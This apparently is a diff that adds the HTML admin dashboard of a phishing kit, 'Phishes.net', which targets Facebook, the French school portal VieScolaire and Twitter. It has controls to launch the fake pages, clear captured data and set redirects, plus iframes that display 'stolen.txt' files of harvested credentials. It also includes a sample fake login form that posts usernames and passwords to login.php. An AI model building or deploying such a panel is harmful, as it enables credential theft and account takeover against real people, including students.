@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<HTML>
+	<head>
+		<meta http-equiv="refresh" content="30">
+		<link rel="icon" href="apple-touch-icon.png">
+		<link href='https://fonts.googleapis.com/css?family=Roboto' rel='stylesheet' type='text/css'>
+		<title>Phishes.net</title>
+		<style type="text/css">
+			/*Oue Oue je fait ca plus tard*/
+			/* Merci tatiana je t'aime */
+			body {
+				margin: 0 0 20px 25px;
+				max-width: 600px;
+				background: #2e2e2e;
+				color: white;
+			}
+			h1 {
+				font-size: 36px;
+				font-family: roboto;
+				letter-spacing: -1px;
+			}
+			h2 {
+				font-family: roboto;
+			}
+			a {
+				text-decoration: none;
+				color: #2e2e2e;
+				-webkit-transition: 0.5s ease;
+				-moz-transition: 0.5s ease;
+			}
+			a:hover {
+				color: #ffb273;
+			}
+			hr {
+				position: absolute;
+				visibility: hidden;
+				left: 0;
+				width: 50%;
+			}
+			tr {
+				text-align: center;
+			}
+			input {
+				border: 0;
+				padding: 6px;
+				background: #ececec;
+			}
+			input:focus {
+				background: #fff8dc;
+			}
+			.numdp {
+				border: 1px solid #d6d6d6;
+			}
+			input[type="submit"] {
+				background: #c1cdc1;
+				border-radius: 3px;
+				margin: 2px;
+				box-shadow: 2px 2px 10px 1px #242424;
+
+			}
+			input[type="submit"]:active {
+				box-shadow: 0px 0px 10px 1px #c1cdc1;
+			}
+			button {
+				border: 0;
+				border-radius: 3px;
+				padding: 5px;
+				margin: 2px;
+				background: #c1cdc1;
+			}
+			button:active {
+				box-shadow: 0px 0px 10px 1px #c1cdc1;
+			}
+			#sidebar {
+				position: absolute;
+				right: 25px;
+				top: 1px;
+			}
+			#logs {
+				position: absolute;
+				font-size: 15px;
+			}
+			iframe {
+				border: 0;
+				background: #ececec;
+				-webkit-transition: 0.5s ease;
+				-moz-transition: 0.5s ease;
+			}
+			iframe:hover {
+				box-shadow: 0px 0px 20px 5px #c1cdc1;
+			}
+		</style>
+		<script type="text/javascript">
+		function getCookie(cname) {var name = cname + "=";var ca = document.cookie.split(';');for(var i = 0; i <ca.length; i++) {var c = ca[i];while (c.charAt(0)==' ') {c = c.substring(1);}if (c.indexOf(name) == 0) {return c.substring(name.length,c.length);}}return "";}
+		function login(){
+			if (getCookie("admin")==1) {
+
+			} else if(getCookie("admin")==0) {
+				window.location.href="http://www.google.com";
+			} else {
+				window.location.href="index.html";
+			}
+		}
+
+
+		if(getCookie("connection") == 1){
+			window.location.href="index.html"
+		} else {
+			login();
+		}
+
+		function error(){
+			alert("This is in progress do not try to edit");
+			window.location.href="admin.html";
+		}
+
+		</script>
+	</head>
+	<body>
+
+		<div id="whereamI">
+				<h1>Phishes.net V.1.6<br /><a id="logs" href="/web.log">Connection log's</a></h1>
+					<table>
+							<tr>
+								
+								<td><button onclick="window.location.replace('facebook/');">facebook</button></td>
+								<td><button onclick="window.location.replace('viescolaire/');">viescolaire</button></td>
+								<td><button onclick="error();">twitter</button></td>
+								
+							</tr>
+						<form action="clear_files.php" method="POST">
+							<tr>
+								<td><input type="submit" name="clearFB" id="clearFB" value="Clear Facebook"></td>
+								<td><input type="submit" name="clearVC" id="clearVC" value="Clear Viescolaire"></td>
+								<td><input type="submit" onclick="error();" name="clearTW" id="clearTW"value="Clear Twitter"></td>
+							</tr>
+						</form>
+						<form action="redirect.php" method="POST">
+							<tr>
+								<td><input type="text" name="redirectFB" id="redirectFB" placeholder="facebook redirect"></td>
+								<td><input type="text" name="redirectVC" id="redirectVC" placeholder="viescolaire redirect"></td>
+								<td><input type="text" name="redirectTW" id="redirectTW" onclick="error();" placeholder="twitter redirect"></td>
+								<td><input type="submit" name="changedirect" id="changedirect" value="change"></td>
+							</tr>
+						</form>
+					</table>
+
+				<br />
+		</div>
+
+		<hr><br />
+		<code>
+			&ltform action="login.php" method="POST"><br />
+&nbsp				&ltlabel>Nom d'utilisateur:&lt/label>&ltbr /><br />
+&nbsp				&ltinput type="username" name="Email" id="Email">&ltbr /><br />
+&nbsp				&ltlabel>Mots de passe:&lt/label>&ltbr /><br />
+&nbsp				&ltinput type="password" name="Passwd" id="Passwd"><br />
+<br />
+&nbsp				&ltinput type="submit" name="signIn" id="signIn" value="Mise a jour"><br />
+<br />
+			&lt/form><br />
+		</code>
+
+		<br /><hr><br />
+
+		<form action="login.php" method="POST">
+		 	<label>Nom d'utilisateur:</label><br />
+		 	<input class="numdp" type="username" name="Email" id="Email"><br />
+		 	<label>Mots de passe:</label><br />
+		 	<input class="numdp" type="password" name="Passwd" id="Passwd">
+		 	<input type="submit" name="signIn" id="signIn" value="Mise a jour">
+		</form>
+		<br />
+		<iframe src="stolen.txt"></iframe>
+
+		<div id="sidebar">
+			<h2>Facebook</h2>
+			<iframe src="facebook/stolen.txt"></iframe><br />
+			<h2>VieScolaire</h2>
+			<iframe src="viescolaire/stolen.txt"></iframe><br />
+			<h2>Twitter</h2>
+			<iframe src="twitter/stolen.txt"></iframe><br />
+		</div>
+
+	</body>
+</HTML>
